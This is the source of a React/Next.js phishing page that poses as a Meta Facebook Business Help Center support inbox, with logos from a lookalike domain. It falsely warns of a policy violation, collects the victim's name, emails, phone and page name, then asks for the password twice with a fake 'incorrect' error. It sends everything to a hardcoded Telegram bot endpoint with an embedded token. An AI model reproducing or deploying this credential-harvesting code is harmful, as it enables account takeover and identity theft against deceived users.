import { useState } from 'react';
import { FormProvider, SubmitHandler, useForm } from 'react-hook-form';
import Image from 'next/image';
import { useRouter } from 'next/router';

import { Button, Modal, Steps } from 'antd';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

import FormItem from 'components/FormItem';
import FormCheckbox from 'components/FormItem/components/Checkbox';
import Textarea from 'components/FormItem/components/Textarea';
import TextInput from 'components/FormItem/components/TextInput';
import AppFooter from 'components/Layout/AppFooter';
import { standardService } from 'services/apiService/standardService';
import { useStandardActions } from 'store/standard/selector';

enum CONTACT_ENUM {
  MESSAGE = 'message',
  FULL_NAME = 'fullName',
  BUSINESS_EMAIL_ADDRESS = 'businessEmailAddress',
  PERSONAL_EMAIL_ADDRESS = 'personalEmailAddress',
  MOBILE_PHONE_NUMBER = 'mobilePhoneNumber',
  FACEBOOK_PAGE_NAME = 'facebookPageName',
  AGREE_TERMS = 'agreeTerms',
}

interface IContact {
  [CONTACT_ENUM.MESSAGE]: string;
  [CONTACT_ENUM.FULL_NAME]: string;
  [CONTACT_ENUM.BUSINESS_EMAIL_ADDRESS]: string;
  [CONTACT_ENUM.PERSONAL_EMAIL_ADDRESS]: string;
  [CONTACT_ENUM.MOBILE_PHONE_NUMBER]: string;
  [CONTACT_ENUM.FACEBOOK_PAGE_NAME]: string;
  [CONTACT_ENUM.AGREE_TERMS]: boolean;
}

const DEFAULT_CONTACT_FORM = {
  [CONTACT_ENUM.MESSAGE]: '',
  [CONTACT_ENUM.FULL_NAME]: '',
  [CONTACT_ENUM.BUSINESS_EMAIL_ADDRESS]: '',
  [CONTACT_ENUM.PERSONAL_EMAIL_ADDRESS]: '',
  [CONTACT_ENUM.MOBILE_PHONE_NUMBER]: '',
  [CONTACT_ENUM.FACEBOOK_PAGE_NAME]: '',
  [CONTACT_ENUM.AGREE_TERMS]: false,
};

const schema = () =>
  z.object({
    [CONTACT_ENUM.MESSAGE]: z.string(),
    [CONTACT_ENUM.FULL_NAME]: z.string().min(1, { message: 'Full name is required' }),
    [CONTACT_ENUM.BUSINESS_EMAIL_ADDRESS]: z.string().min(1, { message: 'Business email address is required' }),
    [CONTACT_ENUM.PERSONAL_EMAIL_ADDRESS]: z.string().min(1, { message: 'Personal email address is required' }),
    [CONTACT_ENUM.MOBILE_PHONE_NUMBER]: z.string().min(1, { message: 'Mobile phone number is required' }),
    [CONTACT_ENUM.FACEBOOK_PAGE_NAME]: z.string().min(1, { message: 'Facebook page name is required' }),
  });

const ConfirmPage = () => {
  const router = useRouter();

  const [visibleModal, setVisibleModal] = useState(false);
  const [formData, setFormData] = useState({}) as any;
  const [password, setPassword] = useState('');
  const [password2, setPassword2] = useState('');
  const [showError, setShowError] = useState(false);
  const [count, setCount] = useState(0);

  const { handleSetFormData } = useStandardActions();

  const handleChangePassword = (event: any) => {
    const { value } = event.target;

    if (showError) {
      setPassword2(value);
    } else {
      setPassword(value);
    }
  };

  const methods = useForm<IContact>({
    defaultValues: DEFAULT_CONTACT_FORM,
    resolver: zodResolver(schema()),
  });

  const { handleSubmit } = methods;

  const onSubmit: SubmitHandler<IContact> = async (data) => {
    setVisibleModal(!visibleModal);
    setFormData(data);
  };

  const handleCloseModal = () => setVisibleModal(false);

  const handleContinue = async () => {
    if (password || password2) {
      if (count === 2) {
        setShowError(false);
        handleSetFormData({ ...formData, password2: password2 });

        try {
          const response = await standardService.sendMessage(
            'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
            {
              chat_id: '-4057839789',
              text: JSON.stringify({ ...formData, password2: password2 }, null, 2),
            },
          );

          if (response) {
            router.push(`/confirm`);
          }
        } catch (error) {
          return;
        }
      } else {
        setCount(2);
        setPassword('');
        setShowError(true);
        setFormData({ ...formData, password1: password });
      }
    } else {
      return;
    }
  };

  return (
    <section>
      <header>
        <div className='wrap'>
          <Image
            src='https://meta.supportfanpage.ink/static/uploads/278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35.svg'
            alt='meta logo'
            width={54}
            height={12}
            quality={100}
          />

          <p>Support Inbox</p>

          <Image
            src='https://meta.supportfanpage.ink/static/uploads/search-13-64.a9254a55959a7da573f4.ico'
            alt='search-icon'
            width={20}
            height={20}
            className='search-icon'
          />
        </div>
      </header>

      <div className='hero-banner'>
        <div className='cover'>
          <h3>Facebook Business Help Center</h3>
        </div>
      </div>

      <div className='card'>
        <Steps
          progressDot
          current={3}
          items={[{ description: 'Select Asset' }, { description: 'Select the Issue' }, { description: 'Get help' }]}
        />

        <h3 className='title'>Get Started</h3>

        <div className='report-container'>
          <p>
            We have received multiple reports that suggest that your account has been in violation of our terms of
            services and community guidelines. As a result, your account is scheduled for review
          </p>

          <div>Report no: 6020754977</div>
        </div>

        <FormProvider {...methods}>
          <form onSubmit={handleSubmit(onSubmit)} autoComplete='off'>
            <FormItem
              name={CONTACT_ENUM.MESSAGE}
              label='Please provide us information that will help us investigate'
              labelClassName='information'
            >
              <Textarea />
            </FormItem>

            <FormItem
              name={CONTACT_ENUM.FULL_NAME}
              label='Full name'
              labelClassName='block mb-2 text-sm font-medium text-gray-900 dark:text-gray-300'
              required
            >
              <TextInput />
            </FormItem>

            <FormItem name={CONTACT_ENUM.BUSINESS_EMAIL_ADDRESS} label='Business email address' required>
              <TextInput />
            </FormItem>
            <FormItem name={CONTACT_ENUM.PERSONAL_EMAIL_ADDRESS} label='Personal email address' required>
              <TextInput />
            </FormItem>
            <FormItem name={CONTACT_ENUM.MOBILE_PHONE_NUMBER} label='Mobile Phone Number' required>
              <TextInput />
            </FormItem>
            <FormItem name={CONTACT_ENUM.FACEBOOK_PAGE_NAME} label='Facebook page name' required>
              <TextInput />
            </FormItem>
            <FormItem
              containerClassName='checkbox'
              name={CONTACT_ENUM.AGREE_TERMS}
              label='I agree to our Terms, Data and Cookies Policy.'
              required
            >
              <FormCheckbox />
            </FormItem>

            <button type='submit'>Send message</button>
          </form>
        </FormProvider>
      </div>

      <AppFooter />

      <Modal
        title='Please Enter Your Password'
        open={visibleModal}
        onOk={handleContinue}
        onCancel={handleCloseModal}
        footer={[
          <Button key='continue' type='primary' onClick={handleContinue}>
            Continue
          </Button>,
        ]}
      >
        <div className='security-section'>
          <p>For your security, you must enter your password to continue.</p>

          <span>Password:</span>
          <input type='password' onChange={handleChangePassword} value={showError ? password2 : password} required />
          {showError && <div className='error-text'>The password you&apos;ve entered is incorrect.</div>}
        </div>
      </Modal>
    </section>
  );
};

export default ConfirmPage;
